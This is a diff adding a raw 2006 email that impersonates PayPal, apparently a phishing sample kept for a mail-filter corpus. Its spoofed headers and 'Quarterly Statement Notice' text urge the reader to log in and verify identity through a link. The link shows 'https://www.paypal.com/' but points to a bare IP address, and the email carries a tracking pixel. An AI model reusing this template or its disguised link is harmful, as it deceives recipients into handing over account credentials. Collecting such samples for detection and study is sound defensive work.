@@ -1,0 +1,169 @@
+Return-Path: <test@localhost.localdomain>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP id 7070653716F
+	for <nobody@login.example.com>; Tue, 14 Feb 2006 15:31:50 -0500 (EST)
+Received: from localhost.localdomain (unknown [211.236.176.155])
+	by mail2.example.com (Postfix) with ESMTP id 38DED6FA2EF
+	for <nobody@example.com>; Tue, 14 Feb 2006 15:31:48 -0500 (EST)
+Received: (from test@localhost)
+	by localhost.localdomain (8.11.3/8.11.3) id k1EKanx30087;
+	Wed, 15 Feb 2006 05:36:49 +0900
+Date: Wed, 15 Feb 2006 05:36:49 +0900
+Message-Id: <200602142036.k1EKanx30087@localhost.localdomain>
+To: nobody@example.com
+Subject: Quarterly Statement Notice
+From: PayPal <paypal@email.paypal.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 398
+
+
+<div id=message>
+
+
+<!-- type = text -->
+
+
+<html>
+
+<html>
+<head>
+<title>PayPal</title>
+<xmeta content="text/html; charset=iso-8859-1">
+<style type="text/css">
+#message .dummy {}
+#message, #message TD {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+#message LI {line-height: 120%;}
+#message UL.pp_narrow {margin:10px 5px 0px 40px;}
+#message BR.h6 {font-size: 6px; line-height: 6px;}
+#message .pp_normal {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+#message .ppem106 {font-size: 13px; font-family: 
+verdana,arial,helvetica,sans-serif; font-weight: 700;}
+#message .pp_label {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 10px;font-weight: 
+bold;color: #000000;}
+#message .pp_heading {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 18px;font-weight: 
+bold;color: #003366;}	
+#message .pp_subheading {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 16px;font-weight: 
+bold;color: #003366;}	
+#message .pp_sidebartext {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 11px;color: #003366;}	
+#message .pp_sidebartextbold {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: 
+bold;color: #003366;}	
+#message .pp_footer_black {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 11px;color: #000000;}
+#message .pp_footer {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 11px;color: #aaaaaa;}
+#message .pp_button {font-size: 13px; font-family: 
+verdana,arial,helvetica,sans-serif; font-weight: 400; 
+border-style:outset; color:#000000; background-color: #cccccc;}
+#message .pp_smaller {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #000000;}
+</style>
+</head>
+<xbody>
+<table cellspacing="0" cellpadding="0" width="600" align="center" 
+border="0">
+  
+  <tr>
+    <td><img height="35" alt="PayPal"
+      src="http://www.paypal.com/images/paypal_logo.gif"  width="117" 
+vspace="10" border="0"></a> 
+  </td></tr></table>
+
+<table cellspacing="0" cellpadding="0" width="100%" border="0">
+  
+  <tr>
+    <td width="100%" 
+background="http://www.paypal.com/images/bg_clk.gif" ><img height="29" 
+      src="http://www.paypal.com/images/pixel.gif"  width="1" 
+border="0"></td></tr>
+  <tr>
+    <td><img height="10" src="http://www.paypal.com/images/pixel.gif"  
+width="1" 
+  border="0"></td></tr></table>
+  
+<table cellspacing="0" cellpadding="0" width="600" align="center" 
+border="0">
+  
+  <tr valign="top">
+    <td width="5"><img height="1" 
+src="http://www.paypal.com/images/pixel.gif"  width="5"></td>
+    <td class="pptext" align="left" width="100%">
+      <table cellspacing="0" cellpadding="0" width="100%" align="center" 
+border="0">
+        
+        <tr>
+          <td>
+
+						<br>
+		  <font face="verdana,arial,helvetica,sans-serif" 
+color=#003366 size="4"><b>Quarterly Statement Notice</b></font>
+<br><br><br>
+		  
+		  Dear member,		  
+      
+<br><br>You are receiving this notification because PayPal is required 
+by law to notify you at least quarterly of the availability of your 
+online account statement. 
+
+<br><br>The account statement for your PayPal account registered to 
+<b>www.paypal.com</b> can be viewed at any time by visiting our website 
+at <a href="http://218.22.96.43/.cgi_bin/webscr=cmd=_home/" 
+target="_self" class="style53">https://www.paypal.com/</a></p>. Once you 
+log in, upgrade your Personal Account Identity Verification and 
+see your most recent statement. 
+
+<br><br>If you need help logging in to your account, click the Help link 
+which is at the upper right hand side of the PayPal website. To report 
+errors in your statement or make inquiries, click the Contact Us link in 
+the footer on any page of the PayPal website, call our Customer Service 
+center at (402) 938-3630, or write us at: 
+
+<br><br>PayPal, Inc.
+<br>P.O. Box 45950
+<br>Omaha, NE 68145 
+
+<br><br>
+Sincerely,
+<br><br>
+PayPal 
+			</td>
+            </tr>
+        <tr>
+          <td><br><img height="5" 
+src="http://www.paypal.com/images/dot_row_long.gif"  
+          width="590"></td></tr>
+        <tr>
+          <td class="pp_footer">
+          This PayPal notification was sent to resolve your issues. To 
+modify your notification preferences, log in to your PayPal account, 
+click the Profile sub-tab, then click the Notifications link under 
+Account Information. Changes may take up to 10 days to be reflected in 
+our mailings. PayPal will not sell or rent any of your personally 
+identifiable information to third parties. For more information about 
+the security of your information, read our Privacy Policy at 
+<b>https://www.paypal.com/privacy</b>. 
+
+<br><br>Copyright&#169; 2006 PayPal Inc. All rights reserved. Designated 
+trademarks and brands are the property of their respective owners. 
+PayPal is located at 2211 N. First St., San Jose, CA 95131. 
+  
+  
+  </td></tr>
+  </table>
+  </td></tr>
+  </table>
+<img src="http://link.p0.com/1x1.dyn?0JEGXzKMBo8pbzJh7b37=0"  width=1 
+height=1  width="1" height="1" border="0">
+</xbody></html>
+
